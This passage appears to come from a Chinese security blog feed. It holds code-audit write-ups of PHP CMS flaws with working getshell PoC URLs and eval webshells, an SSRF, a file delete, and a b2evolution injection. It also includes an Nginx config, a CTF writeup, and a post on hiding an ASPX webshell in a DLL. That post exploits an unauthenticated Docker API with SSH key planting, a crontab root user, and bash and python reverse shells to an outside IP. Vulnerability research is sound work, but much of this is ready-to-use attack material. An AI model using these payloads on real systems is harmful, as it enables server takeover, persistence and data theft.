fopen(iconv($codeold,$codenew,"./&#123;$lang_langshuom&#125;.txt"),w);fputs($fp, $cont);fclose($fp);$zip_list = $archive-&gt;add(iconv($codeold,$codenew,"./&#123;$lang_langshuom&#125;.txt"));@file_unlink("./$title.csv");@file_unlink(iconv($codenew,$codeold,"./$title.csv"));@file_unlink(iconv($codeold,$codenew,"./&#123;$lang_langshuom&#125;.txt")); (1)文件名截断+任意内容写入 将lang_langshuom参数的值经过iconv转换后直接写文件，由于PHP版本&lt;5.4.0时,会忽略掉不认识的字符，所以可以控制文件名参数lang_langshuom生成php后缀文件，同时将lang_csvexplain1、lang_csvexplain2、lang_csvexplain3参数的内容写入文件，所以存在getshell的风险。 请求如下：1/admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=tmp.php%80&amp;lang_csvexplain1=&lt;?php @eval($_GET[1])?&gt; (2)条件竞争 然而由于@file_unlink(iconv($codeold,$codenew,”./{$lang_langshuom}.txt”));会删除生成的shell文件，不能手动getshell，再次分析源码发现，此处为生成了shell文件，然后再删除。所以只要在删除前请求shell生成其他文件即可，即利用条件竞争，生成持久性webshell,写脚本即可实现。 2. POC脚本1略 修改参数后执行效果如下：12python poc.pyshell @ http://127.0.0.1/某CMS 5.3.19//admin/app/batch/shell.php ps:利用php特性可以不用条件竞争，直接getshell1admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=1.php/.%80&amp;lang_csvexplain1=&lt;?php @eval($_GET[1])?&gt; 0x03 CVE-2017-11347补丁绕过继续Getshell前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名） 1. 查找绝对路径的方法： 利用安装目录下的phpinfo文件： /install/phpinfo.php 利用报错信息(信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页)123/app/system/include/public/ui/admin/top.php/app/system/include/public/ui/admin/box.php/app/system/include/public/ui/web/sidebar.php 2. 漏洞分析5.3.19版本针对CVE-2017-11347的补丁分析12345678910111213141516171819202122232425262728293031switch($val[2])&#123; case 1: $address="../about/$fileaddr[1]"; break; case 2: $address="../news/$fileaddr[1]"; break; case 3: $address="../product/$fileaddr[1]"; break; case 4: $address="../download/$fileaddr[1]"; break; case 5: $address="../img/$fileaddr[1]"; break; case 8: $address="../feedback/$fileaddr[1]"; break; default: $address = ""; break;&#125; $newfile ="../../../$val[1]"; if($address != '')&#123; Copyfile($address,$newfile); &#125; &#125;&#125; 即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。 漏洞利用(网站安装在服务器根路径的情况)： 第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;在后台”地址栏图标”处上传该文件。得到地址为：http://localhost/upload/file/1506587082.ico 第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):1http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506587082.ico/..\..\..\www\about\shell.php|1 shell的地址为：1http://localhost/about/shell.php 3. POC(注意左斜杠和右斜杠不能随意更改)：1http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\上传ico文件的相对路径/..\..\..\网站index.php路径的上一层目录名\about\webshell的文件名|1 特别注意其中的：“网站index.php上层目录名”， 1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”; 如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。 2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。 例如:网站搭建在:http://localhost/某CMS 5.3.19/,则第二步的payload如下：12http://localhost/某CMS 5.3.19/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506588072.ico/..\..\..\某CMS 5.3.19\about\shell.php|1 相应生成的shell地址为：1http://localhost/某CMS 5.3.19/about/shell.php 0x04 Copyindx函数处理不当Getshell1. 声明此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347：https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下： （1）触发函数是Copyindex函数，而非Copyfile （2）此漏洞不是利用文件包含require_one，而是利用任意内容写入 （3）此漏洞Getshell不需要上传图片 （4）结合CSRF可以实现一键Getshell 2. 漏洞点123456789101112131415161718192021222324252627282930313233343536373839404142# admin/app/physical/physical.php:197-236switch($op)&#123; case 1: if(is_dir('../../../'.$val[1]))&#123; deldir('../../../'.$val[1]); echo $lang_physicaldelok; &#125; else&#123;unlink('../../../'.$val[1]); echo $lang_physicaldelok; &#125; break; case 2: $adminfile=$url_array[count($url_array)-2]; $strsvalto=readmin($val[1],$adminfile,1); filetest('../../../'.$val[1]); deldir('../../../'.$val[1]); $dlappfile=parse_ini_file('dlappfile.php',true); if($dlappfile[$strsvalto]['dlfile'])&#123; $return=varcodeb('app'); $checksum=$return['md5']; $met_file='/dl/app_curl.php'; $stringfile=dlfile($dlappfile[$strsvalto]['dlfile'],"../../../$val[1]"); &#125;else&#123; $met_file='/dl/olupdate_curl.php'; $stringfile=dlfile("v$metcms_v/$strsvalto","../../../$val[1]"); &#125; if($stringfile==1)&#123; echo $lang_physicalupdatesuc; &#125; else&#123; echo dlerror($stringfile); die(); &#125; break; case 3: $fileaddr=explode('/',$val[1]); $filedir="../../../".$fileaddr[0]; if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; if($fileaddr[1]=="index.php")&#123; Copyindx("../../../".$val[1],$val[2]); &#125; 当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：12345678910#admin/include/global.func.php:877-884function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; $oldcont ="&lt;?php\n# 某CMS Enterprise Content Management System \n# Copyright (C) 某CMS Co.,Ltd (http://www.某CMS.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) 某CMS Co., Ltd. (http://www.某CMS.cn). All rights reserved.\n?&gt;"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; 可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell. 3. POC(xxx为任意的shell目录，index.php文件名不能修改)1http://localhost/某CMS 5.3.18/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=123|xxx/index.php|123;phpinfo();?&gt;/* 生成的shell地址：1http://localhost/某CMS 5.3.18/xxx/index.php 0x05 olupdate文件缺陷导致Getshell1. 漏洞点12345678910111213141516171819202122232425262728293031323334353637#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程#326-360行$num=1;$random = met_rand(6);$date=date('Ymd',time());require_once '../system/database/global.func.php';do&#123; $sqldump = ''; $startrow = ''; $tables=tableprearray($tablepre); $sizelimit=2048; $tableid = isset($tableid) ? $tableid - 1 : 0; $startfrom = isset($startfrom) ? intval($startfrom) : 0; $tablenumber = count($tables); for($i = $tableid; $i &lt; $tablenumber &amp;&amp; strlen($sqldump) &lt; $sizelimit * 1000; $i++)&#123; $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump)); $startfrom = 0; &#125; $startfrom = $startrow; $tableid = $i; if(trim($sqldump))&#123; $sqlfile[]=$bakfile = "../update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql"; $version='version:'.$metcms_v; $sqldump = "#某CMS .cn Created &#123;$version&#125; \n#&#123;$met_weburl&#125;\n#&#123;$tablepre&#125;\n#&#123;$met_webkeys&#125;\n# --------------------------------------------------------\n\n\n".$sqldump; if(!file_put_contents($bakfile, $sqldump))&#123; dl_error($lang_updaterr2."(&#123;$adminfile&#125;/update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql)",$type,$olid,$ver,$addr,$action); &#125; &#125; $num++;&#125;while(trim($sqldump));if(is_array($sqlfile)) $string = "&lt;?php\n \$sqlfile = ".var_export($sqlfile, true)."; ?&gt;";filetest("../update/$addr/sqlist.php");if(!file_put_contents("../update/$addr/sqlist.php",$string))&#123; dl_error($lang_updaterr2."(&#123;$adminfile&#125;/update/$addr/sqlist.php)",$type,$olid,$ver,$addr,$action);&#125; 此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。 PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_db_name}{$date}{$random}_{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可) 最后的payload结构如下：1/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=shell内容&amp;addr=shell的目录&amp;tableid=1000 2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)1http://xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=&lt;?php phpinfo();?&gt;&amp;addr=12313&amp;tableid=1000 执行后的shell地址：1http://xxx.com/admin/update/12313/sqlist.php]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NoneCMS1.3版本SSRF漏洞]]></title>
    <url>%2F2018%2F01%2F23%2FNonecms_ssrf%2F</url>
    <content type="text"><![CDATA[0x00前言NoneCMS添加文章处过滤不严存在SSRF漏洞 0x01漏洞分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#application/admin/controller/Article.phppublic function copy() &#123; if (request()-&gt;isAjax()) &#123; $url = input('post.url'); $cid = input('post.cid'); if (!$url || !substr_count($url, 'csdn')) &#123; exit(json_encode(['status' =&gt; 0, 'msg' =&gt; '请输入csdn博客文章地址', 'url' =&gt; ''])); &#125; if (!$cid) &#123; exit(json_encode(['status' =&gt; 0, 'msg' =&gt; '请先选择分类', 'url' =&gt; ''])); &#125; try &#123; \phpQuery::newDocumentFile($url); $title = pq('.link_title a')-&gt;text(); if (!$title) &#123; $title = pq('.list_c_t a')-&gt;text(); &#125; if (!$title) &#123; $title = pq('h1.csdn_top')-&gt;text(); &#125; $content = pq('#article_content')-&gt;text(); //如果抓取不到主内容 if (!$content) &#123; throw new Exception("文章不存在或禁止爬虫"); &#125; $params['cid'] = $cid; $params['content'] = $content; $params['title'] = $title; $params['publishtime'] = ''; $params['description'] = trim(strip_tags($content)); $params['copyfrom'] = $url; $article = new articleModel(); if ($article-&gt;data($params,true)-&gt;save()) &#123; return ['status' =&gt; 1, 'msg' =&gt; '转载成功', 'url' =&gt; url('article/index', ['id' =&gt; $cid])]; &#125; else &#123; return ['status' =&gt; 0, 'msg' =&gt; '转载失败', 'url' =&gt; '']; &#125; &#125; catch (Exception $e) &#123; return ['status' =&gt; 0, 'msg' =&gt; '添加失败：' . $e-&gt;getMessage(), 'url' =&gt; '']; &#125; &#125; else &#123; return $this-&gt;fetch(); &#125; &#125; 1.当请求copy方法时首先判断请求方式为Ajax，然后检测要求存在url参数,并且url中包含csdn字符串即可（很容易利用?csdn绕过）。2.调用\phpQuery::newDocumentFile，函数内容如下：123456public static function newDocumentFile($file, $contentType = null) &#123; $documentID = self::createDocumentWrapper( file_get_contents($file), $contentType ); return new phpQueryObject($documentID);&#125; 请求目标url,内部调用了file_get_contents请求。3.由此可见，存在ssrf漏洞。 0x02POC: 目标服务器成功收到请求 0x03小结需要管理员登录后才能利用，且由于请求目标不是CSDN，会导致copy函数后面的处理获取不到有效数据，会提示“服务器出错”，但是实际请求已经成功发送出去了。 0x04修复建议利用parse_url提取URL的域名是否属于CSDN。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NoneCMS后台任意文件删除]]></title>
    <url>%2F2018%2F01%2F22%2FNonecms%2F</url>
    <content type="text"><![CDATA[0x00前言这两天学习Thinkphp5.1的开发手册，顺便审计一下NoneCMS，利用框架的安全性避免了不少的问题，但还是发现一枚任意文件删除漏洞。 0x01漏洞分析1234567891011121314151617181920212223242526272829303132#application/admin/controller/Main.php public function upload() &#123; if (!input('?param.act')) &#123; $file = request()-&gt;file('pic_url'); $info = $file -&gt;validate(['size'=&gt; 1024*1024*2,'ext'=&gt;['jpg', 'png', 'jpeg', 'gif', 'bmp']]) -&gt;move(Env::get('root_path') . 'public/uploads'); if ($info) &#123; // 成功上传后 获取上传信息 $save_name = $info-&gt;getSaveName(); $realpath = __ROOT__.'/uploads/' . $save_name; exit(json_encode(['status' =&gt; 1, 'path' =&gt; $realpath, 'save_name' =&gt; $save_name])); &#125; else &#123; // 上传失败获取错误信息 exit(json_encode(['status' =&gt; 0, 'error' =&gt; $file-&gt;getError()])); &#125; &#125; else &#123; //删除图片 $img_dir = input('param.path'); $real_path = str_replace(Env::get('root_path'),'',$img_dir); $path = str_replace(['/..\/','/../'],'/',Env::get('root_path').$real_path); echo $path ; if (@unlink($path)) &#123; exit(json_encode(['status' =&gt; 1, 'msg' =&gt; '删除成功'])); &#125; else &#123; exit(json_encode(['status' =&gt; 0, 'msg' =&gt; '删除失败'])); &#125; &#125; &#125; 1.当请求upload方法时，如果if (!input(‘?param.act’))不成立，即存在act参数的情况下，进入else分支。2.此时将path参数的值经过str_replace替换后传入unlink函数，直接删除，由于过滤不严导致任意文件删除。3.可以采用绝对路径的方式或者windows下用..\绕过str_replace的限制。 0x02任意文件删除POC:123http://127.0.0.1/NoneCMS/public/admin/main/upload/act/1?path=public/install/install.lockhttp://127.0.0.1/NoneCMS/public/admin/main/upload/act/1?path=..\..\..\..\..\..\..\test.txt 0x03小结这个漏洞需要至少能够登录后台的管理员登录才能利用。 0x04修复建议 此处功能为删除图片，可以严格检查删除文件名的后缀是否为图片 同时过滤..\和../]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[B2evolution安装过程过滤不严导致Getshell漏洞分析（CVE-2017-1000423）]]></title>
    <url>%2F2018%2F01%2F17%2Fb2evolution_getshell%2F</url>
    <content type="text"><![CDATA[0x00前言好久没有更新博客了，看到b2evolution6.6.0 - 6.8.10被爆出安装过程过滤不严导致Getshell漏洞（CVE-2017-1000423），简单分析一下。 0x01复现环境搭建123git clone https://github.com/b2evolution/b2evolution.gitcd b2evolutiongit checkout -b 6.8.10 0x02分析过程1.请求http://localhost/b2evolution/install/index.php?action=start 2.输入Base URL的值如下（需要有效的数据库配置） 1http://localhost/b2evolution/\\';phpinfo();// 3.处理过程跟进install/_functions_install.php 123456789101112131415161718192021222324252627#第1899行 array( "\$db_config = array(\n" ."\t'user' =&gt; '".str_replace( array( "'", "\$" ), array( "\'", "\\$" ), $params['db_user'] )."',\$1" ."\t'password' =&gt; '".str_replace( array( "'", "\$" ), array( "\'", "\\$" ), $params['db_password'] )."',\$2" ."\t'name' =&gt; '".str_replace( array( "'", "\$" ), array( "\'", "\\$" ), $params['db_name'] )."',\$3" ."\t'host' =&gt; '".str_replace( array( "'", "\$" ), array( "\'", "\\$" ), $params['db_host'] )."',\$4", "tableprefix = '".str_replace( "'", "\'", $params['db_tableprefix'] )."';", "baseurl = '".str_replace( "'", "\'", $params['baseurl'] )."';", "admin_email = '".str_replace( "'", "\'", $params['admin_email'] )."';", 'config_is_done = 1;', ), $conf ); // Write new contents: if( save_to_file( $conf, $conf_filepath, 'w' ) ) &#123; display_install_messages( sprintf( T_('Your configuration file &lt;code&gt;%s&lt;/code&gt; has been successfully created.').'&lt;/p&gt;', $conf_filepath ), 'success' ); $tableprefix = $params['db_tableprefix']; $baseurl = $params['baseurl']; $admin_email = $params['admin_email']; $config_is_done = 1; if( ! $params['quick_install'] ) &#123; // Switch to menu only on standard installation: $action = 'menu'; &#125; &#125; 其中针对baseurl的处理如下，即替换单引号&#39;为\&#39;： 1"baseurl = '".str_replace( "'", "\'", $params['baseurl'] )."';" 字符串baseurl处理后如下:1http://localhost/b2evolution/\\\';phpinfo();// 所以导致了单引号的逃逸，紧接着调用save_to_file存入/conf/_basic_config.php文件。 4.打开/conf/_basic_config.php文件内容如下：1$baseurl = 'http://localhost/b2evolution/\\';phpinfo();//'; 5.shell地址：1http://localhost/b2evolution/ 0x03小结这个漏洞需要在重装的时候才能利用，可以结合任意文件删除漏洞利用。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配置HTTPS与http运维实践]]></title>
    <url>%2F2017%2F11%2F29%2Fnginx_http_https%2F</url>
    <content type="text"><![CDATA[0x00前言最近采用Linux+Nginx+PHP+Mysql的方式搭建一个CodeIgniter框架的系统，需求为除了某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问。 0x01系统搭建 服务器配置ubuntu+nginx+mysql+php5配置，参考链接：How To Install Linux, nginx, MySQL, PHP (LEMP) stack on Ubuntu 14.04 HTTPS配置，参考链接：How To Secure Nginx with Let’s Encrypt on Ubuntu 14.04 0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置 按照前面系统搭建过程安装并配置、选择采用全部重定向HTTPS的默认配置文件如下: 1234567891011121314151617181920212223242526272829303132333435363738server &#123; listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /usr/share/nginx/html; index index.php index.html index.htm; server_name 域名或IP地址; location / &#123; try_files $uri $uri/ =404; &#125; error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; listen 443 ssl; # managed by Certbot ssl_certificate fullchain.pem文件路径; # managed by Certbot ssl_certificate_key privkey.pem文件路径; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot if ($scheme != "https") &#123; return 301 https://$host$request_uri; &#125; # managed by Certbot&#125; 根据需求添加对CodeIgniter框架的支持和某个特定URL采用HTTP访问，其余均强制采用HTTPS访问。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152server &#123; listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /usr/share/nginx/html; index index.php index.html index.htm; server_name 域名; location / &#123; try_files $uri $uri/ =404; &#125; location /二级目录/ &#123; try_files $uri /二级目录/index.php; &#125; error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \.php$ &#123; try_files $uri =404; fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; listen 443 ssl; # managed by Certbot ssl_certificate /etc/letsencrypt/live/域名/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/域名/privkey.pem; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot set $flag 0; if ($scheme != "https") &#123; set $flag "$&#123;flag&#125;1"; &#125; if ($request_uri != "特定的URL") &#123; set $flag "$&#123;flag&#125;2"; &#125; if ($flag = "012") &#123; return 301 https://$host$request_uri; &#125; # managed by Certbot&#125; 其中主要添加如下两处配置配置： 对CodeIgniter框架的支持 1fastcgi_param PATH_INFO $fastcgi_path_info; 某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问添加的配置，由于Nginx的判断if条件不支持逻辑&amp;&amp;，需求的等价逻辑如下： 123if ($scheme != "https" &amp;&amp; $request_uri != "特定的URL" )&#123; return 301 https://$host$request_uri;&#125; 曲折的具体实现为：1234567891011set $flag 0;if ($scheme != "https") &#123; set $flag "$&#123;flag&#125;1";&#125;if ($request_uri != "特定的URL") &#123; set $flag "$&#123;flag&#125;2";&#125;if ($flag = "012") &#123; return 301 https://$host$request_uri;&#125; # managed by Certbot 0x03小结通常网络上关于NginxHTTPS配置主要有两种:HTTP和HTTPS同时存在或者所有HTTP强制转发HTTPS。然而项目需要特定URL支持HTTP访问，其余URL强制采用HTTPS，所有产生了本文。此外添加$scheme != “https”的判断是为了防止请求被循环重定向导致网页无法正常访问的问题，由于Nginx配置文件不支持逻辑与（and），采用等价的配置完成需要的功能。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISC极客嘉年华OpenCTF-2017Writeup]]></title>
    <url>%2F2017%2F09%2F13%2FOpenctf-2017%2F</url>
    <content type="text"><![CDATA[0x00前言这是一次很简单很简单的CTF,就当练练手吧…… 0x01 Writeup1.WEB1.1 variacover请求http://202.112.51.184:8103/?id=a[0]=240610708得到flag XCTF{sTr_covcderd_AND_you_kn0W?} 1.2 urldecode请求http://202.112.51.184:8102?id=OPE%25%34%65CTF得到flag XCTF{UrlDeCode_oL_yOu_lol!} 1.3 SQL注入用sqlmap注入 python sqlmap.py -u &quot;http://202.112.51.184:8201?id=1&quot; --dump -T &quot;flag&quot; -D &quot;security&quot; 得到flag XCTF{ut9x2a5f8t9e6s3a4g5j} 1.4 jsjs由于禁用右键功能，使用Firefox的Web Developer插件查看源代码得到flag XCTF{_O0oo0O_js_is_FUNNY!} 2.REVERSEOpenReverse下载文件，直接用notepade++打开，看到flag: XCTF{5eacs6y8p1o9gitc9521} 3.PWN3.1 getshell参考 CSAW CTF 2016 aul (100) Writeup在webshell中直接执行如下命令：os.execute(“ls”)os.execute(“cat flag”)得到flag: XCTF{q0Cr1iwqlW*W1m8ejiK*0z9JUa1gq@n&amp;} 3.2 blind执行如下python程序1python -c 'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)' | nc 202.112.51.184 8301 得到flag: XCTF{sQ^yeLZKBVkoZ7^zOtigV5xsepBY&amp;bB7} 4.MISC4.1 zip利用Advanced ZIP Password Recovery 4.0,选择纯数字爆破得到zip解密密码为88888888，解压压缩包的flag: XCTF{ke&amp;cVR3OHWHx42ZygOceozE6KIxz1Zzj} 4.2 pcapWireshark追踪流得：12345678GET /?q=XCTF%7BRSUJecDZ5xFp1z1X%26Nmpt%40PZSDQ%25Gbx6%7D HTTP/1.1Accept: text/html, application/xhtml+xml, image/jxr, */*Referer: http://192.168.1.115/Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-GB;q=0.5,en;q=0.3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063Accept-Encoding: gzip, deflateHost: 192.168.1.115Connection: Keep-Alive 对参数q的值URLdecode后获得flag: XCTF{RSUJecDZ5xFp1z1X&amp;Nmpt@PZSDQ%Gbx6} 5.CRYPTO5.1 Maya Cipher百度搜索Maya numerals的编码规则如下： 得到1234584354467b323031385f69735f636f6d696e677d 每行对应16进制解码得flag: XCTF{2018_is_coming} 5.2 RSA12345678910111213141516171819202122def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mp = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537d = modinv(e, (p-1)*(q-1))print dc= 69016319356655639210194946570348715066396274579181987745484908846232464436640043461016746215950609916307004870722625663551955221548688400875709926061159609460224830151731941059363474236594094101209402353834752606848369320902191207004466087273869348206495061740962728586464640440980967989689860668335396868406m=pow(c,d,p*q)print "flag:"print m flag:554035859905981120888026046266284028688068004006280022208626]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ASPX编译dll隐藏shell&Docker Remote API利用姿势]]></title>
    <url>%2F2017%2F09%2F11%2FDll-aspx%26docker%2F</url>
    <content type="text"><![CDATA[0x00 前言这是很久之前的一次内部分享，整理后分享出来。 0x01 ASPX编译Dll隐藏shell准备工作 ASPX木马（copy到一个单独的文件夹,aabb.aspx为例） aspnet_compiler.exe(安装了Microsoft .net framework后不同版本均带有此软件，2.0版默认在C:\Windows\Microsoft.NET\Framework\v2.0.50727） 新建目标文件夹（Dll生成的位置，target为例） ASPX运行解析环境（最好IIS,本次以PageAdmin携带的AspNet.EXE便携版解析环境为例） ASPX编译Dll12aspnet_compiler.exe -v / -p ASPX木马绝对路径 target目标文件绝对路径例如：aspnet_compiler.exe -v / -p C:\Users\test\Desktop\zhou4\aspx_shell\test\ C:\Users\test\Desktop\zhou4\aspx_shell\target 命令执行完毕后，在target目标文件夹下的bin目录生成对应Dll文件和一些其他文件 测试环境使用我所提到的环境编译的情况下，处于功能测试目的，直接运行target目标文件夹下的AspNet.exe即可运行，浏览器访问对应的木马文件名，如aabb.aspx即可正常访问shell木马。然而打开aabb.aspx文件发现并没有实际内容，将其删除对木马功能没有任何影响 渗透实际环境 打开编译target目录下bin/*.compiled文件,记录其中assembly（dll文件名和type的值（类名）（此处assembly=”App_Web_gsaqzno3” type=”ASP.aabb_aspx”） 编辑目标主机网站目录的Web.config文件，在&lt;add verb代码附近添加如下代码： 1234567891011&lt;add verb="*" path="木马最终访问路径" type="type的值（类名），assembly的值（dll文件名）" validate="True"/&gt;例如：&lt;add verb="*" path="aabb.aspx" type="ASP.aabb_aspx,App_Web_amovoubm" validate="True"/&gt;如果没有&lt;add verb在&lt;system.web&gt;# 省略其他 &lt;httpHandlers&gt; &lt;add verb="*" path="aabb.aspx" type="ASP.aabb_aspx,App_Web_amovoubm" validate="True"/&gt; &lt;/httpHandlers&gt; &lt;/system.web&gt; 将Dll文件copy到目标主机网站根目录/bin目录下访问网站链接木马路径即可 0x02 Remote API利用姿势主要问题：docker remote api未授权 1.测试环境准备测试环境：快捷安装shipyard(docker图形化管理)，未设置访问权限 12#在安装docker环境下curl -sSL https://shipyard-project.com/deploy | bash -s 2.漏洞检测与利用准备 查看docker集群信息 1docker -H 目标IP info 查看docker集群镜像 1docker -H 目标IP images 在目标服务器建立docker容器（最好选择服务器已有镜像），并挂载目标服务器所有文件路径到容器/var/hack路径下 1docker -H 目标IP run -d -v /:/var/hack --name getshell tutum/lamp 进入docker容器进行漏洞利用（此处name为getshell 1docker -H 123.207.*.* exec -it getshell /bin/bash 3.漏洞利用姿势3.1上传公钥证书直接root登录生成公私钥对 1ssh-keygen -t rsa 上传公钥到目标主机/root/.ssh/authorized_keys文件，然后ssh直接登录root（如果私钥设置密码，需要输入密码） 3.2修改crontab添加root权限用户编辑/etc/crontab文件最后添加 12*/1 * * * * root /usr/sbin/useradd 用户名-u 0 -g 0 -o &amp;&amp; echo "用户名:密码"|chpasswd*/1 * * * * root /usr/sbin/useradd 123 -u 0 -g 0 -o &amp;&amp; echo "123:123456"|chpasswd ssh连接，使用新建的用户名密码登录3.3修改crontab反弹shellbash版（前两句代码指定运行的环境变量）123SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/bin*/1 * * * * root bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1 python版12*/1 * * * * root python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.207.*.*",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'python -c 'import os;os.popen("bash -i &gt;&amp; /dev/tcp/123.207.*.*/8888 0&gt;&amp;1");' 3.4编写web目录下的文件直接getshell这个不多说 提示:本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>ASPX</tag>
        <tag>Webshell隐藏</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里先知XSS挑战赛]]></title>
    <url>%2F2017%2F08%2F30%2Falixss%2F</url>
